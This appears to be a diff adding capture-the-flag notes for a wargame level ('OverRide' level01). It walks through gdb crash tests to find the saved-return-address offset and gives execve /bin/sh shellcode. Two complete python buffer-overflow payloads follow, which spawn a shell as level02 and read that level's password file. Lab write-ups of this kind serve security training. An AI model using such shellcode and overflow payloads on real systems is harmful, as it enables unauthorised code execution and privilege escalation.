@@ -356,3 +356,212 @@ nope, incorrect password...
 Segmentation fault (core dumped)
 
 
+aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+
+
+(gdb) r
+Starting program: /home/users/level01/level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+verifying username....
+
+nope, incorrect username...
+
+[Inferior 1 (process 1939) exited with code 01]
+(gdb) r
+Starting program: /home/users/level01/level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wilaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+verifying username....
+
+Enter Password: 
+
+nope, incorrect password...
+
+[Inferior 1 (process 1942) exited with code 01]
+(gdb) r
+Starting program: /home/users/level01/level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wilaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x45454545 in ?? ()
+
+0x45 -> E
+
+dat_wilaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEE
+
+dat_wilaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDD0000
+
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level01/level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wilaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDD0000
+verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x30303030 in ?? ()
+
+
+dat_wilaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDD0000
+
+
+dat_wil: pre-padding	|	7  	|	+	| 
+[a...D]: padding		|	328	| 	335	|	+
+0000: EIP overload  	|	4  	| 		|	339
+
+______
+
+char local_54 [64];
+fgets(local_54,100,stdin);
+
+
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level01/level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password: 
+aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDD0000
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x75757575 in ?? ()
+
+
+0x75 -> u
+
+aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuu
+
+aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrsssstttt0000
+
+
+[a...D]: padding		|	80	|	+
+0000: EIP overload  	|	4  	|	84
+
+_______
+
+
+level01@OverRide:~$ ltrace ./level01 
+__libc_start_main(0x80484d0, 1, -10284, 0x80485c0, 0x8048630 <unfinished ...>
+puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
+)                     = 39
+printf("Enter Username: ")                                      = 16
+fgets(Enter Username: dat_wil
+"dat_wil\n", 256, 0xf7fcfac0)                             = 0x0804a040
+puts("verifying username....\n"verifying username....
+
+)                                = 24
+puts("Enter Password: "Enter Password: 
+)                                        = 17
+fgets(test
+"test\n", 100, 0xf7fcfac0)                                = 0xffffd6ec
+puts("nope, incorrect password...\n"nope, incorrect password...
+
+)                           = 29
++++ exited (status 1) +++
+
+_________
+
+
+
+
+```
+\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+```
+size : 21
+
+
+--
+
+dat_wil: pre-padding	|	7  	|	+	| 
+[a...D]: padding		|	328	| 	335	|	+
+0000: EIP overload  	|	4  	| 		|	339
+
+
+[dat_wil] [shellcode] [padding] [new EIP]
+└───┬───┘ └────┬────┘ └───┬───┘ └───┬───┘
+	7		   21		  ?			4
+└─────────┬─────────┘
+		  28
+└──────────────┬──────────────┘
+			  335
+└───────────────────┬───────────────────┘
+					339
+
+? = 335 - 28 = 307
+
+[new EIP] = fgets(username) => 0x0804a040
+
+0x0804a040 + 7 (dat_wil) = 0x0804a047
+
+\x47\xa0\x04\x08
+
+(python -c "print 'dat_wil' + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'a' * 307 + '\x47\xa0\x04\x08'"; cat)
+
+
+level01@OverRide:~$ (python -c "print 'dat_wil' + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'a' * 307 + '\x47\xa0\x04\x08'"; cat) | ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+id 
+uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+
+_____
+
+[a...D]: padding		|	80	|	+
+0000: EIP overload  	|	4  	|	84
+
+
+[shellcode] [padding] [new EIP]
+└────┬────┘ └───┬───┘ └───┬───┘
+	 21			?		  4
+└─────────┬─────────┘
+	  	  80 
+└──────────────┬──────────────┘
+		   	   84
+
+? = 80 - 21 = 59
+
+[new EIP] = fgets(password) => 0xffffd6ec
+
+\xec\xd6\xff\xff
+
+
+(python -c "print 'dat_wil'"; sleep 1; python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'a' * 59 + '\xec\xd6\xff\xff'"; cat)
+
+level01@OverRide:~$ (python -c "print 'dat_wil'"; sleep 1; python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'a' * 59 + '\xec\xd6\xff\xff'"; cat) | ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+id
+uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+
+--
